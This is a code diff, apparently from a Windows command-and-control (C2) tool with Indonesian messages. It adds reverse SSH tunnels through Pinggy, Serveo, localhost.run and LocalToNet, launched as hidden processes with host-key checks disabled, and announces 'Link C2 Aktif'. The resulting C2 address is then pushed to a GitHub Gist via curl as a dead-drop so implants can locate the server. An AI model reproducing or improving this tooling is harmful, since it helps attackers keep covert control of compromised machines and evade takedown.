@@ -1,6 +1,7 @@
 #include "../include/tunnel_manager.h"
 #include "../include/common_state.h"
 #include <fstream>
+#include <algorithm>
 #include <thread>
 #include <chrono>
 #include <cstring>
@@ -80,11 +81,28 @@ bool IsProcessRunning(const std::string& processName) {
     return false;
 }
 
-void StartTunnelAndGetUrl(int port, std::string& public_url) {
-    (void)port;
+void EnsureSSHKey() {
+    std::string user_profile = getenv("USERPROFILE");
+    std::string ssh_dir = user_profile + "\\.ssh";
+    std::string key_path = ssh_dir + "\\id_rsa";
     
-    // Clear old state for fresh start
-    global_public_url = "None"; // Match common_state.cpp initial value
+    // Check if key exists
+    std::ifstream f(key_path);
+    if (!f.good()) {
+        std::cout << INFO_TAG << "Menyiapkan SSH Key baru..." << std::endl;
+        CreateDirectoryA(ssh_dir.c_str(), NULL);
+        std::string gen_cmd = "ssh-keygen -t rsa -N \"\" -f \"" + key_path + "\"";
+        if (RunHiddenProcessSync(gen_cmd)) {
+            std::cout << SUCCESS_TAG << "SSH Key berhasil dibuat." << std::endl;
+        } else {
+            std::cout << ERROR_TAG << "Gagal membuat SSH Key otomatis." << std::endl;
+            return;
+        }
+    }
+}
+
+void StartTunnelAndGetUrl(int port, std::string& public_url, TunnelType type) {
+    global_public_url = "None";
     global_gist_success = false;
 
     bool alreadyRunning = IsProcessRunning(LOCALTONET_EXE) || IsProcessRunning(SSH_EXE);
@@ -94,20 +112,37 @@ void StartTunnelAndGetUrl(int port, std::string& public_url) {
         return;
     }
 
-    std::cout << INFO_TAG << "Memulai Tunneling (Zero-Log Handshake)... " << std::endl;
-    
-    CleanupSystem(); // Aggressive cleanup
-    std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    CleanupSystem();
+    EnsureSSHKey();
 
-    std::string localtonet_path = "tools\\" + std::string(LOCALTONET_EXE);
-    std::string token = std::string(LOCALTONET_TOKEN);
-    
-    std::string cmd = localtonet_path;
-    if (!token.empty() && token != "YOUR_TOKEN" && token != "2002202") {
-        cmd += " --authtoken " + token;
+    std::string cmd;
+    std::string provider_name;
+
+    if (type == TunnelType::LOCALTONET) {
+        provider_name = "LocalToNet";
+        std::string localtonet_path = "tools\\" + std::string(LOCALTONET_EXE);
+        std::string token = std::string(LOCALTONET_TOKEN);
+        cmd = localtonet_path;
+        if (!token.empty() && token != "YOUR_TOKEN" && token != "2002202") {
+            cmd += " --authtoken " + token;
+        }
+    } else if (type == TunnelType::PINGGY) {
+        provider_name = "Pinggy.io";
+        std::string token = std::string(PINGGY_TOKEN);
+        std::string ssh_target = "tcp@free.pinggy.io";
+        if (!token.empty() && token != "YOUR_TOKEN") {
+            ssh_target = token + "+" + ssh_target;
+        }
+        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -p 443 -R0:localhost:" + std::to_string(port) + " " + ssh_target + "\"";
+    } else if (type == TunnelType::SERVEO) {
+        provider_name = "Serveo.net";
+        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -R 0:localhost:" + std::to_string(port) + " serveo.net\"";
+    } else if (type == TunnelType::LOCALHOST_RUN) {
+        provider_name = "Localhost.run";
+        cmd = "cmd.exe /c \"echo. | ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ServerAliveInterval=30 -o IdentitiesOnly=yes -i \"%USERPROFILE%/.ssh/id_rsa\" -T -R 80:localhost:" + std::to_string(port) + " ssh.localhost.run\"";
     }
 
-    // --- MEMORY-BASED HANDSHAKE (No Log Files) ---
+    // --- SYNCHRONOUS MEMORY-BASED HANDSHAKE ---
     HANDLE hRead, hWrite;
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
@@ -127,9 +162,9 @@ void StartTunnelAndGetUrl(int port, std::string& public_url) {
 
     if (CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         free(cmdBuf);
-        CloseHandle(hWrite); // Close write end in parent
+        CloseHandle(hWrite);
 
-        std::cout << INFO_TAG << "Menunggu Sinkronisasi Alamat (Handshake)... " << std::flush;
+        std::cout << INFO_TAG << "Handshake [" << provider_name << " (Sync)]... " << std::flush;
         
         bool success = false;
         std::string capturedOutput;
@@ -138,38 +173,101 @@ void StartTunnelAndGetUrl(int port, std::string& public_url) {
         
         auto start_time = std::chrono::steady_clock::now();
         while (true) {
+            DWORD exitCode;
+            if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) break;
+
             DWORD avail = 0;
             if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                 if (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                     buffer[bytesRead] = '\0';
                     capturedOutput += buffer;
                     
-                    size_t pos = capturedOutput.find("ADDED");
-                    if (pos != std::string::npos) {
-                        size_t start = capturedOutput.find_first_not_of(" \t", pos + 5);
-                        size_t end = capturedOutput.find("TCP", start);
-                        if (start != std::string::npos && end != std::string::npos) {
-                            public_url = capturedOutput.substr(start, end - start);
-                            public_url.erase(public_url.find_last_not_of(" \n\r\t") + 1);
-                            global_public_url = public_url;
-                            std::cout << " [SIP]" << std::endl;
-                            std::cout << SUCCESS_TAG << "Link C2 Aktif: " << CYAN << public_url << RESET << std::endl;
-                            UpdateGitHubGist(public_url);
-                            success = true;
-                            break;
+                    if (type == TunnelType::LOCALTONET) {
+                        size_t pos = capturedOutput.find("ADDED");
+                        if (pos != std::string::npos) {
+                            size_t start = capturedOutput.find_first_not_of(" \t", pos + 5);
+                            size_t end = capturedOutput.find("TCP", start);
+                            if (start != std::string::npos && end != std::string::npos) {
+                                public_url = capturedOutput.substr(start, end - start);
+                                success = true;
+                            }
                         }
+                    } else if (type == TunnelType::PINGGY) {
+                        size_t pos = capturedOutput.find("tcp://");
+                        if (pos != std::string::npos) {
+                            size_t end = capturedOutput.find(".link:", pos);
+                            if (end != std::string::npos) {
+                                size_t port_end = capturedOutput.find_first_of(" \n\r\t", end + 6);
+                                public_url = capturedOutput.substr(pos, port_end - pos);
+                                success = true;
+                            }
+                        }
+                    } else if (type == TunnelType::SERVEO || type == TunnelType::LOCALHOST_RUN) {
+                        size_t pos_srveo = capturedOutput.find("Forwarding TCP connections from ");
+                        if (pos_srveo == std::string::npos) pos_srveo = capturedOutput.find("Forwarding SSH traffic from ");
+                        
+                        size_t pos_lhr = capturedOutput.find(".lhr.life");
+                        
+                        if (pos_srveo != std::string::npos) {
+                            size_t start = capturedOutput.find("from ", pos_srveo) + 5;
+                            size_t end = capturedOutput.find_first_of(" \n\r\t", start);
+                            public_url = capturedOutput.substr(start, end - start);
+                            success = true;
+                        } else if (pos_lhr != std::string::npos) {
+                            // Localhost.run cleaner extraction (Skip banner/username)
+                            size_t start = capturedOutput.rfind(" ", pos_lhr);
+                            if (start == std::string::npos || (pos_lhr - start) > 50) 
+                                start = capturedOutput.rfind("\n", pos_lhr);
+                                
+                            if (start == std::string::npos) start = 0; else start++;
+                            
+                            size_t end = capturedOutput.find_first_of(" \n\r\t", pos_lhr);
+                            public_url = capturedOutput.substr(start, end - start);
+                            
+                            // Remove "user" or "tun-" prefix if mistakenly caught
+                            if (public_url.find("user") != std::string::npos) public_url = public_url.substr(4);
+                            if (public_url.find("tun-") != std::string::npos) public_url = public_url.substr(4);
+                            
+                            success = true;
+                        }
+                    }
+
+                    if (success) {
+                        // REFINED SANITIZATION: Remove ALL whitespace, newlines, and carriage returns
+                        if (public_url.find("tcp://") == 0) public_url = public_url.substr(6);
+                        public_url.erase(std::remove(public_url.begin(), public_url.end(), '\n'), public_url.end());
+                        public_url.erase(std::remove(public_url.begin(), public_url.end(), '\r'), public_url.end());
+                        public_url.erase(std::remove(public_url.begin(), public_url.end(), ' '), public_url.end());
+                        public_url.erase(public_url.find_last_not_of(" \n\r\t") + 1);
+                        
+                        // AUTO-PORT: If no port is assigned, append :80 (Professional standard for LHR/SSH)
+                        if (public_url.find(':') == std::string::npos && !public_url.empty()) {
+                            public_url += ":80";
+                        }
+                        
+                        global_public_url = public_url;
+                        std::cout << " [SIP]" << std::endl;
+                        std::cout << SUCCESS_TAG << "Link C2 Aktif: " << CYAN << public_url << RESET << std::endl;
+                        
+                        // Async cloud sync so terminal returns immediately
+                        std::thread gist_thread(UpdateGitHubGist, public_url);
+                        gist_thread.detach();
+                        break;
                     }
                 }
             }
 
             auto now = std::chrono::steady_clock::now();
-            if (std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count() > 30) break;
-            std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Optimized delay
+            if (std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count() > 45) break;
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
 
         if (!success) {
             std::cout << " [GAGAL]" << std::endl;
-            std::cout << ERROR_TAG << "Tunnel Handshake Gagal! Pastikan Token benar atau Koneksi stabil." << std::endl;
+            std::cout << ERROR_TAG << "Tunnel Handshake Gagal! Pastikan Koneksi stabil atau SSH Key terdaftar." << std::endl;
+            if (!capturedOutput.empty()) {
+                std::cout << GRAY << "Debug Info: " << capturedOutput.substr(0, 150) << (capturedOutput.length() > 150 ? "..." : "") << RESET << std::endl;
+            }
         }
 
         CloseHandle(hRead);
@@ -179,7 +277,7 @@ void StartTunnelAndGetUrl(int port, std::string& public_url) {
         free(cmdBuf);
         CloseHandle(hRead);
         CloseHandle(hWrite);
-        std::cout << ERROR_TAG << "Gagal menjalankan localtonet.exe!" << std::endl;
+        std::cout << ERROR_TAG << "Gagal menjalankan tunnel process!" << std::endl;
     }
 }
 
@@ -190,15 +288,17 @@ std::string GetDetailedTunnelLogs() {
 void UpdateGitHubGist(const std::string& public_url) {
     if (public_url.empty() || std::string(GIST_ID) == "YOUR_GIST_ID") return;
     
+    std::cout << INFO_TAG << "Sinkronisasi Cloud (GitHub Gist) berjalan di latar belakang..." << std::endl;
+
     std::string payload = "{\"files\": {\"c2_address.txt\": {\"content\": \"" + public_url + "\"}}}";
-    std::string payloadPath = "gist_payload.json";
+    std::string payloadPath = "gist_" + std::to_string(GetTickCount()) + ".json";
     std::ofstream out(payloadPath);
     out << payload;
     out.close();
 
     std::string cmd = "curl -X PATCH -H \"Accept: application/vnd.github.v3+json\" ";
     cmd += "-H \"Authorization: token " + std::string(GITHUB_TOKEN) + "\" ";
-    cmd += "-d @gist_payload.json https://api.github.com/gists/" + std::string(GIST_ID) + " -s -o NUL";
+    cmd += "-d @\"" + payloadPath + "\" https://api.github.com/gists/" + std::string(GIST_ID) + " -s -o NUL";
     
     bool res = RunHiddenProcessSync(cmd);
     remove(payloadPath.c_str());
